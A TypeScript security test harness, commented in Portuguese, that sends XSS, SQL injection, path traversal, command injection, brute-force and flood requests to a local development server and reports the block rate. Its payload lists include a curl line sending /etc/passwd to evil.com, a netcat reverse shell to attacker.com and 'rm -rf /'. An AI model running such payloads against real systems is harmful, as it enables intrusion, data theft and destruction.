import { createLogger } from '../infra/structured-logger.js';

const logger = createLogger('attack-testing');

/**
 * Conjunto de testes de ataque para validação de segurança
 */
export class AttackTester {
  private baseUrl: string;
  private results: Array<{
    test: string;
    type: string;
    payload: string;
    blocked: boolean;
    status?: number;
    response?: any;
    error?: string;
  }> = [];

  constructor(baseUrl: string = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
  }

  /**
   * Executa todos os testes de ataque
   */
  async runAllTests(): Promise<void> {
    console.log('🚀 Iniciando testes de ataque...');
    
    await this.testXSS();
    await this.testCSRF();
    await this.testSQLInjection();
    await this.testPathTraversal();
    await this.testCommandInjection();
    await this.testBruteForce();
    await this.testFlood();
    await this.testMaliciousHeaders();
    await this.testSuspiciousQueries();
    
    this.generateReport();
  }

  /**
   * Testa ataques XSS
   */
  private async testXSS(): Promise<void> {
    console.log('🔍 Testando ataques XSS...');
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
    ];

    for (const payload of xssPayloads) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            data: payload,
            search: payload,
          }),
        });

        this.results.push({
          test: 'XSS',
          type: 'Cross-Site Scripting',
          payload,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'XSS',
          type: 'Cross-Site Scripting',
          payload,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa bypass de CSRF
   */
  private async testCSRF(): Promise<void> {
    console.log('🔍 Testando bypass de CSRF...');
    
    // Teste sem token CSRF
    try {
      const response = await fetch(`${this.baseUrl}/api/trpc/auth.login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
      });

      this.results.push({
        test: 'CSRF',
        type: 'Cross-Site Request Forgery',
        payload: 'No CSRF token',
        blocked: response.status >= 400,
        status: response.status,
        response: await response.text(),
      });
    } catch (error) {
      this.results.push({
        test: 'CSRF',
        type: 'Cross-Site Request Forgery',
        payload: 'No CSRF token',
        blocked: true,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // Teste com token inválido
    try {
      const response = await fetch(`${this.baseUrl}/api/trpc/auth.login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': 'invalid-token',
        },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
      });

      this.results.push({
        test: 'CSRF',
        type: 'Cross-Site Request Forgery',
        payload: 'Invalid CSRF token',
        blocked: response.status >= 400,
        status: response.status,
        response: await response.text(),
      });
    } catch (error) {
      this.results.push({
        test: 'CSRF',
        type: 'Cross-Site Request Forgery',
        payload: 'Invalid CSRF token',
        blocked: true,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  /**
   * Testa SQL Injection
   */
  private async testSQLInjection(): Promise<void> {
    console.log('🔍 Testando SQL Injection...');
    
    const sqlPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "'; DROP TABLE users; --",
      "'; INSERT INTO users VALUES('hacker', 'password'); --",
      "' UNION SELECT * FROM users --",
      "' UNION SELECT username, password FROM users --",
      "1' OR '1'='1",
      "admin'--",
      "admin'/*",
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test?search=${encodeURIComponent(payload)}`, {
          method: 'GET',
        });

        this.results.push({
          test: 'SQL Injection',
          type: 'SQL Injection',
          payload,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'SQL Injection',
          type: 'SQL Injection',
          payload,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa Path Traversal
   */
  private async testPathTraversal(): Promise<void> {
    console.log('🔍 Testando Path Traversal...');
    
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc//passwd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '/var/www/../../etc/passwd',
    ];

    for (const payload of pathPayloads) {
      try {
        const response = await fetch(`${this.baseUrl}/api/files?path=${encodeURIComponent(payload)}`, {
          method: 'GET',
        });

        this.results.push({
          test: 'Path Traversal',
          type: 'Path Traversal',
          payload,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'Path Traversal',
          type: 'Path Traversal',
          payload,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa Command Injection
   */
  private async testCommandInjection(): Promise<void> {
    console.log('🔍 Testando Command Injection...');
    
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '& echo "Command Injection"',
      '`whoami`',
      '$(id)',
      '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
      '| nc attacker.com 4444 -e /bin/sh',
      '; rm -rf /',
    ];

    for (const payload of commandPayloads) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            command: payload,
          }),
        });

        this.results.push({
          test: 'Command Injection',
          type: 'Command Injection',
          payload,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'Command Injection',
          type: 'Command Injection',
          payload,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa Brute Force
   */
  private async testBruteForce(): Promise<void> {
    console.log('🔍 Testando Brute Force...');
    
    const passwords = [
      '123456',
      'password',
      'admin',
      '123456789',
      'qwerty',
      'abc123',
      'password123',
      'admin123',
      'root',
      'toor',
    ];

    for (let i = 0; i < passwords.length; i++) {
      try {
        const response = await fetch(`${this.baseUrl}/api/trpc/auth.login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: 'admin@example.com',
            password: passwords[i],
          }),
        });

        this.results.push({
          test: 'Brute Force',
          type: 'Brute Force Attack',
          payload: `Attempt ${i + 1}: ${passwords[i]}`,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'Brute Force',
          type: 'Brute Force Attack',
          payload: `Attempt ${i + 1}: ${passwords[i]}`,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa Flood
   */
  private async testFlood(): Promise<void> {
    console.log('🔍 Testando Flood...');
    
    const promises = [];
    
    for (let i = 0; i < 100; i++) {
      promises.push(
        fetch(`${this.baseUrl}/api/test`, {
          method: 'GET',
        }).then(async (response) => ({
          test: 'Flood',
          type: 'Flood Attack',
          payload: `Request ${i + 1}`,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        })).catch(error => ({
          test: 'Flood',
          type: 'Flood Attack',
          payload: `Request ${i + 1}`,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        }))
      );
    }

    const results = await Promise.all(promises);
    this.results.push(...results);
  }

  /**
   * Testa Headers Maliciosos
   */
  private async testMaliciousHeaders(): Promise<void> {
    console.log('🔍 Testando Headers Maliciosos...');
    
    const maliciousHeaders = [
      { 'X-Forwarded-For': '<script>alert("XSS")</script>' },
      { 'User-Agent': 'sqlmap/1.0' },
      { 'Referer': 'javascript:alert("XSS")' },
      { 'Cookie': 'session=<script>alert("XSS")</script>' },
      { 'X-Original-URL': '/admin' },
      { 'X-Rewrite-URL': '/admin' },
      { 'X-Forwarded-Host': 'evil.com' },
    ];

    for (const headers of maliciousHeaders) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test`, {
          method: 'GET',
          headers,
        });

        this.results.push({
          test: 'Malicious Headers',
          type: 'Malicious Headers',
          payload: JSON.stringify(headers),
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'Malicious Headers',
          type: 'Malicious Headers',
          payload: JSON.stringify(headers),
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Testa Queries Suspeitas
   */
  private async testSuspiciousQueries(): Promise<void> {
    console.log('🔍 Testando Queries Suspeitas...');
    
    const suspiciousQueries = [
      '?admin=true',
      '?debug=1',
      '?test=1',
      '?config=1',
      '?phpinfo=1',
      '?env=1',
      '?backup=1',
      '?dump=1',
      '?file=../../../etc/passwd',
      '?user=admin',
      '?password=admin',
    ];

    for (const query of suspiciousQueries) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test${query}`, {
          method: 'GET',
        });

        this.results.push({
          test: 'Suspicious Queries',
          type: 'Suspicious Query Parameters',
          payload: query,
          blocked: response.status >= 400,
          status: response.status,
          response: await response.text(),
        });
      } catch (error) {
        this.results.push({
          test: 'Suspicious Queries',
          type: 'Suspicious Query Parameters',
          payload: query,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  /**
   * Gera relatório dos testes
   */
  private generateReport(): void {
    console.log('\n📊 RELATÓRIO DE TESTES DE ATAQUE\n');
    
    const grouped = this.results.reduce((acc, result) => {
      if (!acc[result.test]) {
        acc[result.test] = [];
      }
      acc[result.test].push(result);
      return acc;
    }, {} as Record<string, typeof this.results>);

    let totalTests = 0;
    let blockedTests = 0;

    for (const [testName, results] of Object.entries(grouped)) {
      const blocked = results.filter(r => r.blocked).length;
      const total = results.length;
      const percentage = (blocked / total) * 100;

      console.log(`\n🔹 ${testName}:`);
      console.log(`   Total: ${total}`);
      console.log(`   Bloqueados: ${blocked} (${percentage.toFixed(1)}%)`);
      console.log(`   Status: ${percentage >= 80 ? '✅ BOM' : percentage >= 60 ? '⚠️ REGULAR' : '❌ RUIM'}`);

      if (percentage < 80) {
        console.log('   ❌ ATAQUES NÃO BLOQUEADOS:');
        results.filter(r => !r.blocked).forEach(r => {
          console.log(`     - ${r.payload}`);
        });
      }

      totalTests += total;
      blockedTests += blocked;
    }

    const overallPercentage = (blockedTests / totalTests) * 100;
    
    console.log('\n🎯 RESUMO GERAL:');
    console.log(`   Total de testes: ${totalTests}`);
    console.log(`   Ataques bloqueados: ${blockedTests}`);
    console.log(`   Taxa de bloqueio: ${overallPercentage.toFixed(1)}%`);
    console.log(`   Status geral: ${overallPercentage >= 80 ? '✅ SEGURO' : overallPercentage >= 60 ? '⚠️ PARCIALMENTE SEGURO' : '❌ VULNERÁVEL'}`);

    // Salvar relatório em arquivo
    const reportData = {
      timestamp: new Date().toISOString(),
      summary: {
        total: totalTests,
        blocked: blockedTests,
        percentage: overallPercentage,
        status: overallPercentage >= 80 ? 'SEGURO' : overallPercentage >= 60 ? 'PARCIALMENTE SEGURO' : 'VULNERÁVEL'
      },
      results: this.results
    };

    const fs = require('fs');
    fs.writeFileSync('attack-test-report.json', JSON.stringify(reportData, null, 2));
    console.log('\n📄 Relatório salvo em: attack-test-report.json');
  }
}

/**
 * Endpoint para executar testes de ataque
 */
export function createAttackTestRoutes() {
  const express = require('express');
  const router = express.Router();

  router.post('/run', async (req: any, res: any) => {
    if (process.env.NODE_ENV !== 'development') {
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Attack tests only available in development mode'
      });
    }

    const tester = new AttackTester(req.body.baseUrl || 'http://localhost:3000');
    
    try {
      await tester.runAllTests();
      
      res.json({
        success: true,
        message: 'Attack tests completed',
        reportFile: 'attack-test-report.json'
      });
    } catch (error) {
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to run attack tests',
        detail: error instanceof Error ? error.message : 'Unknown error'
      });
    }
  });

  router.get('/report', (req: any, res: any) => {
    if (process.env.NODE_ENV !== 'development') {
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Attack test report only available in development mode'
      });
    }

    try {
      const fs = require('fs');
      const report = fs.readFileSync('attack-test-report.json', 'utf8');
      res.json(JSON.parse(report));
    } catch (error) {
      res.status(404).json({
        error: 'Not Found',
        message: 'Attack test report not found'
      });
    }
  });

  return router;
}

export default AttackTester;
